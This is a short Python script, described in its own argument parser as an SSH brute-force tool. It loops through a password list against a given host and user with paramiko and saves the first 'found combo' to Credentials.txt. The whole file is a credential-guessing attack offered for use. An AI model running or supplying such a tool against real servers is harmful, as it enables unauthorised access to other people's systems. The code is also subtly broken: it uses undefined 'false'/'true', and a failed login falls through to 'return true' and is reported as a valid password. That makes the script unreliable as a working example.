import paramiko
import socket
import time
from colorama import init , Fore
import argparse

init()

BLUE = Fore.BLUE
GREEN = Fore.GREEN
RESET = Fore. RESET
RED = Fore.RED

def is_ssh_open(hostname ,username ,password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


	try:
		client.connect(hostname = hostname , username = username , password = password , timeout = 3)

	except socket.timeout:
		print(f"{RED} Host:{hostname} is unreachable. Timeout{RESET}")
		return false

	except paramiko.AuthenticationException:
		print(f"Invalid credentials for {username}:{password}")

	except paramiko.SSHException:
		print(f"{BLUE}[*] Retrying after delay... {RESET}")
		time.sleep(60)
		return is_ssh_open(hostname ,username ,password)

	else:
		print(f"{GREEN} Found combo :\n\tHOSTNAME:{hostname}\n\tUSERNAME:{username}\n\tPASSWORD:{password}")

	return true

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description= 'SSH Brute Force.')
	parser.add_argument('host',help='Hostname or IP of the SSH server')
	parser.add_argument('-P', '--passlist' ,help="password file for brute force")
	parser.add_argument('-u','--user',help="Host username")


	args = parser.parse_args()
	host = args.host
	passlist = args.passlist
	user = args.user


	passlist = open (passlist).read().splitlines()
	for password in passlist:
		if is_ssh_open(host , user , password):
			open ("Credentials.txt", 'w').write(f'{user}@{host}:{password}')
			break
